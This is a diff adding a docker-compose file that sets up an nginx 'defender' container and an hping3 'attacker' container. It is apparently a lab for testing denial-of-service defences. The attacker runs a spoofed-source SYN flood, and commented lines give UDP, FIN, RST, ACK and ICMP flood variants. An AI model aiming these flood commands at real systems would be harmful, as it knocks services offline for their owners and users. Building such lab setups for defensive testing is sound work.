@@ -1,0 +1,22 @@
+services:
+  defender:
+    image: nginx:latest
+    container_name: defender
+    platform: linux/amd64
+    volumes:
+      - ./nginx/nginx.conf:/etc/nginx/nginx.conf
+      - ./nginx/index.html:/usr/share/nginx/html/index.html
+    ports:
+      - "80:80"
+
+  attacker:
+    image: utkudarilmaz/hping3:latest
+    container_name: attacker
+    platform: linux/amd64
+    command: --rand-source -S -q -n --flood defender -p 80
+    # command: --rand-source --flood defender -p 80
+    # command: --rand-source --udp --flood defender -p 80
+    # command: --rand-source -F --flood defender -p 80
+    # command: --rand-source -R --flood defender -p 80
+    # command: --rand-source -PA --flood defender -p 80
+    # command: --rand-source -1 --verbose --flood defender -p 80
